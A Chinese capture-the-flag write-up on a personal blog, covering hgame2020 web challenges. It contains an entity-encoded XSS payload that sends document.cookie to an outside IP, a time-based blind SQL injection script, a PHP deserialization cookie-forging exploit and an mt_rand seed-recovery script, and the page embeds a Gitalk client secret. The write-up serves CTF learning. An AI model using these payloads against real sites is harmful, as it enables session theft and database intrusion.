<!DOCTYPE html>
<html>

<head><meta name="generator" content="Hexo 3.9.0">
  
  <title>hgame2020 - MINX&#39;s Blog</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  

  <link rel="shortcut icon" href="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/head.png" type="image/png">
  <meta name="description" content="https://hgame.vidar.club/#/challenge/list">
<meta property="og:type" content="article">
<meta property="og:title" content="hgame2020">
<meta property="og:url" content="http://iminx.cn/2020/02/05/hgame2020/index.html">
<meta property="og:site_name" content="MINX&#39;s Blog">
<meta property="og:description" content="https://hgame.vidar.club/#/challenge/list">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/1.png">
<meta property="og:image" content="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/2.png">
<meta property="og:image" content="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/3.png">
<meta property="og:updated_time" content="2020-02-14T05:37:17.678Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="hgame2020">
<meta name="twitter:description" content="https://hgame.vidar.club/#/challenge/list">
<meta name="twitter:image" content="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/1.png">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
   
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
  
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
  <link rel="stylesheet" href="/css/style.css?v=1589038331351">
</head>

<body class="mdui-drawer-body-left">
  
  <div class="nexmoe-bg" style="background-image: url(https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/4.jpg)"></div>
  <div id="nexmoe-header">
      <div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/">
            <img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/head.png">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>文章</span>17</div>
        <div><span>标签</span>0</div>
        <div><span>分类</span>8</div>
    </div>
    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
    </ul>
    <aside id="nexmoe-sidebar">
  
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">社交按钮</h3>
    <div class="nexmoe-widget nexmoe-social">
        <a class="mdui-ripple" href="https://github.com/clhclh1/clhclh1.github.io" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
            <i class="nexmoefont icon-github"></i>
        </a>
    </div>
</div>
  
  
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章分类</h3>
    <div class="nexmoe-widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AWD/">AWD</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Bypass/">Bypass</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Docker/">Docker</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux基础命令/">Linux基础命令</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/SQL注入/">SQL注入</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Writeup/">Writeup</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/文件上传/">文件上传</a><span class="category-list-count">2</span></li></ul>
    </div>
  </div>


  
  
  
  
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章归档</h3>
    <div class="nexmoe-widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li></ul>
    </div>
  </div>


  
</aside>
    <div class="nexmoe-copyright">
        &copy; 2020 MINX
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
    </div>
</div><!-- .nexmoe-drawer -->

<script>
    const getRealPath = (pathname, desc = false) => {
        if (!pathname) {
            pathname = window.location.pathname
        }
        let names = pathname.split("/")
        if (desc === false) {
            for (let i = names.length - 1; i >= 0; --i) {
                let name = names[i].trim()
                if (name.length > 0 && name !== "/" && name !== "index.html") {
                    return name
                }
            }
        } else {
            for (let i = 0; i < names.length; ++i) {
                let name = names[i].trim()
                if (name.length > 0 && name !== "/" && name !== "index.html") {
                    return name
                }
            }
        }
        return "/"
    }
    let links = document.querySelectorAll('.nexmoe-list-item');
    let rootRealPath = getRealPath(window.location.pathname, true);
    for (let link of links) {
        let linkPath = link.getAttribute("href");
        if (linkPath && getRealPath(linkPath, true) === rootRealPath) {
            link.className = "active nexmoe-list-item mdui-list-item mdui-ripple";
        }
    }
</script>
  </div>
  <div id="nexmoe-content">
    <div class="nexmoe-primary">
        <div class="nexmoe-tab">
            <a mdui-drawer="{target: '#drawer', swipe: true}">
              <i class="mdui-icon material-icons">menu</i>
            </a>
          </div>
        <div class="nexmoe-post">
    <div class="nexmoe-post-cover"> 
        
        <img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/7.jpg">
        
        <h1>hgame2020</h1>
    </div>
  <div class="nexmoe-post-meta">
    <a><i class="nexmoefont icon-calendar-fill"></i>2020年02月05日</a>
    <a><i class="nexmoefont icon-areachart"></i>1,543 字</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 7 分钟</a>
    
      <a class="nexmoefont icon-appstore-fill -link" href="/categories/Writeup/">Writeup</a>
    
    
  </div>
  <article>
    <p><a href="https://hgame.vidar.club/#/challenge/list" target="_blank" rel="noopener">https://hgame.vidar.club/#/challenge/list</a></p>
<a id="more"></a>

<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="Cosmos的博客"><a href="#Cosmos的博客" class="headerlink" title="Cosmos的博客"></a>Cosmos的博客</h2><p>刚开始拿到题目提示说git源码泄露，就用githack把源码扫了下来，但是看了半天没有什么东西，后来看了WP才知道直接去git上找历史提交记录，emmmmm</p>
<h2 id="接头霸王"><a href="#接头霸王" class="headerlink" title="接头霸王"></a>接头霸王</h2><p>考察知识点</p>
<ol>
<li>referer</li>
<li>X-Forwarded-For</li>
<li>UA</li>
<li>请求方式</li>
<li>最后一个也是之前没见过的时间，If-Unmodified-Since，格式If-Unmodified-Since:Tue, 26 Jan 2064 00:00:00 GMT</li>
</ol>
<h2 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h2><p>访问发现403，查看源代码发现提示302跳转，就直接访问index.php并且抓包改一下请求方式，然后提示令a=10，题目又提示a=b+c，就用payload?a=1+9,但是还要url编码一下，不然+会变成空格</p>
<h2 id="鸡尼泰玫"><a href="#鸡尼泰玫" class="headerlink" title="鸡尼泰玫"></a>鸡尼泰玫</h2><p>提示分数要60000以上，抓包改一下就好了</p>
<h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="Cosmos博客的后台"><a href="#Cosmos博客的后台" class="headerlink" title="Cosmos博客的后台"></a>Cosmos博客的后台</h2><p>访问看到登陆界面，刚开始以为是sql注入，弄半天不行，忘记了提示只用了HTML和PHP，然后直接访问发现有?action=login.php，应该可以用php为协议读源码，因此拿到了login.php和admin.php的源码<br>在login.php中发现debug可以读取任意变量，读取一下username和password然后$admin_password又是固定的，读取发现是oe开头的（保存一个0e开头的MD5值和原值以便不时之需s878926199a/<br>0e545993274517709034328855841020），这样就可以突破登陆，就来到了admin.php页面，读源码发现用CSRF和file伪协议拿到flag，payload：file://localhost/flag</p>
<h2 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h2><p>用单引号闭合回显不一样，存在sql<br>注入点，发现过滤了空格还有select，空格可以用/**/绕过，select可以双写绕过。但是这里的#要url编码成%23，不然过不去 ，一直卡在这里，然后就是熟悉的拿flag环节</p>
<h2 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h2><p>访问mycode拿到源码，就是一层又一层的加密，，按照加密步骤解密就好了。由于token会实时刷新，这里用py脚本跑一下就好了</p>
<h2 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h2><p>提示必须管理员的token才能拿flag，结合题目看应该是考察XSS拿cookie。然后开始测试过滤，发现过滤了&lt;，但是可以通过HTML实体编码绕过，构造payload，（这里放一个拿cookie并且登陆的总结文章<a href="https://blog.csdn.net/lhh134/article/details/86477305以便日后忘记）" target="_blank" rel="noopener">https://blog.csdn.net/lhh134/article/details/86477305以便日后忘记）</a><br>然后用payload：<code>&lt;svg/onload=&quot;&amp;#x77;&amp;#x69;&amp;#x6e;&amp;#x64;&amp;#x6f;&amp;#x77;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x2e;&amp;#x68;&amp;#x72;&amp;#x65;&amp;#x66;&amp;#x3d;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x34;&amp;#x37;&amp;#x2e;&amp;#x39;&amp;#x36;&amp;#x2e;&amp;#x32;&amp;#x33;&amp;#x33;&amp;#x2e;&amp;#x32;&amp;#x31;&amp;#x36;&amp;#x2f;&amp;#x3f;&amp;#x73;&amp;#x3d;&amp;#x22;&amp;#x2b;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x3b;&quot;</code>拿到了token<br>/?token=f802788a02a51f9c624bb5d91815b，访问flag页面，改一下token就拿到了flag</p>
<h1 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h1><h2 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h2><p>先查看源代码发现source.zip，拿到源码，初步看一下应该是PHP反序列化的题目，先看一下game.php发现</p>
<pre><code>&lt;?php if($game-&gt;rank-&gt;Get() === 1){?&gt;
        &lt;h2&gt;hgame{flag_is_here}&lt;/h2&gt;
    &lt;?php }?&gt;</code></pre><p>于是找一下game类，其中rank在<strong>construct方法中，新建的Rank类，而Rank类中的rank由</strong>construct方法创建，来自session或者直接随机，也就是说可以让rank=1，但是发现有__destruct方法来判断Rank类是不是服务器定义的，但是这里可以利用construct函数定义$this-&gt;key = &amp;$this-&gt;severKey来绕过，接下来就是找反序列化的点，发现在Monster类中存在反序列化的点，但是是通过cookie的方式传入的，也就是说我们要想办法构造符合的cookie来将payload传入，这里就需要知道encryptKey是多少，而encryptKey是由参数传入的：</p>
<pre><code>$data = [$playerName, $this-&gt;encryptKey];

private function init($data){
        foreach($data as $key =&gt; $value){
            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);
            $this-&gt;sign .= md5($this-&gt;sign . $value);
        }
    }</code></pre><p>其中foreach用法：<br><img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/1.png" alt="1"><br>以及sprintf用法：<br><img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/2.png" alt="2"><br>也就是说我们可以通过将playername赋值为%s就可以循环的将第二个值输出，拿到encryptKey。<br>exp：</p>
<pre><code>&lt;?php
class Rank
{
    private $rank = 1;
    private $serverKey;     // 服务器的 Key
    private $key;

    public function __construct(){
        $this-&gt;key = &amp;$this-&gt;serverKey;
    }
}

$a = new Rank();
$encryptKey = &quot;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&quot;;
$playername = &quot;%s&quot;;
$data = [$playername, $encryptKey];
$sign = &quot;&quot;;
foreach($data as $key =&gt; $value){
    $sign .= md5($sign . $value);
}

$sign = md5(serialize($a) . $sign);

$sign = base64_encode(serialize($a) . $sign);

echo $sign;</code></pre><p>改一下cookie就拿到了flag</p>
<h2 id="二发入魂"><a href="#二发入魂" class="headerlink" title="二发入魂"></a>二发入魂</h2><p>打开题目一脸懵逼，不知道在干什么，也不知道要干什么，看了WP才知道好像是要通过生成的随机数来还原seed，难怪图片说赶快交出种子。。有两种方法可以拿到seed，一种是通过得知</p>
<ol>
<li>从mt_rand()获取2个值：R000以及R227，中间间隔226个值；此外还需知道R000之前已生成的值的个数（用i表示）；</li>
<li>根据这些值算出加扰状态值；</li>
<li>异或这些状态值，推测出原始的状态值（s228）；</li>
<li>根据s228，推测出s0，获取种子。<br><a href="https://www.anquanke.com/post/id/196831" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196831</a><br>还有一种是通过php的php_mt_seed函数直接爆破seed<br><a href="https://www.freebuf.com/vuls/192012.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/192012.html</a></li>
</ol>
<p>放一个网上的exp：</p>
<pre><code>import requests
import os
s = requests.session()
url = &quot;https://twoshot.hgame.n3ko.co/random.php?times=228&quot;
cookie = {&#39;PHPSESSID&#39;:&#39;lf08on0tsqpggqqvulpsg278h1&#39;}
c = s.get(url,cookies = cookie)
ans = str(c.text)
ans = eval(ans)
R0 = ans[0]
R227 = ans[227]
req = &#39;python reverse_mt_rand.py &#39;+str(R0)+&#39; &#39;+str(R227)+&#39; 0 0&#39;
p = os.popen(req)
x = p.read()
p.close()
x = str(x.replace(&#39;\n&#39;,&#39;&#39;))
url2 = &quot;https://twoshot.hgame.n3ko.co/verify.php&quot;
data = {&quot;ans&quot;:x}
final = s.post(url = url2,cookies = cookie,data = data)
print(final.text)
</code></pre><h2 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h2><p>条件竞争的题目，用burp发包，买入比卖出少一些，刷余额</p>
<h2 id="Cosmos的留言板-2"><a href="#Cosmos的留言板-2" class="headerlink" title="Cosmos的留言板-2"></a>Cosmos的留言板-2</h2><p>发现删除留言部分存在sql注入，由于没有回显，只能盲注<br><img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/3.png" alt="3"></p>
<p>时间盲注脚本：</p>
<pre><code>import requests
import time

url = &quot;http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=&quot;

test = &quot;select/**/database()&quot;

schema = &quot;select/**/schema_name/**/from/**/information_schema.schemata/**/limit/**/0,1&quot;

table = &quot;select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1&quot;

column = &quot;select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#39;user&#39;/**/limit/**/0,1&quot;

data = &quot;select/**/concat_ws(0x5e,name,password)/**/from/**/babysql.user/**/limit/**/0,1&quot;

result = &quot;&quot;

cookie = {&#39;PHPSESSID&#39;:&#39;9g4b91gspvooe2up4k2blubbqo&#39;}

for i in range(1,20):
    for j in range(33,127):
        payload = url + &quot;if(ascii(substr(({}),{},1))={},sleep(5),1)--+&quot;.format(data,i,j)
        print(chr(j))
        t1 = time.time()
        r = requests.get(payload,cookies = cookie)
        t2 = time.time()
        if(t2-t1&gt;=5):
            result+=chr(j)
            print(result)
            break
</code></pre><p>拿到账号密码，但是登陆提示错误，不知道是什么原因，多跑几次才拿到了正确的账号密码：cosmos^f1FXOCnj26Fkadzt4Sqynf6O7CgR</p>

  </article>
  
    
<div class="nexmoe-post-copyright">
<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
<strong>本文作者：</strong>MINX<br>
<strong>本文链接：</strong><a href="http://iminx.cn/2020/02/05/hgame2020/" title="http://iminx.cn/2020/02/05/hgame2020/" target="_blank" rel="noopener">http://iminx.cn/2020/02/05/hgame2020/</a><br>

  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可 <br> <a href="http://www.miitbeian.gov.cn/">闽ICP备19007766号</a>

</div>

<div class="BbeiAn-info"">
  {{ __('闽ICP备') }} -
  <a href="http://www.miitbeian.gov.cn/">19007766号</a>
  
</div>
{% endif %}
  
  <section class="nexmoe-comment">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
<div id="gitalk"></div>
<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
<script type="text/javascript">
    var gitalk = new Gitalk({
        clientID: '80b2453b6d5f37ad6225',
        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
        id: window.location.pathname,
        repo: 'nexmoe.github.io',
        owner: 'nexmoe',
        admin: 'nexmoe'
    })
    gitalk.render('gitalk')
</script>
</section>
</div>
    </div>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
 
    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>


 
    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>


<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>

<script src="/js/app.js?v=1589038331340"></script>
<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
<br>
<a href="http://www.miitbeian.gov.cn/">闽ICP备19007766号</a>
  





<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>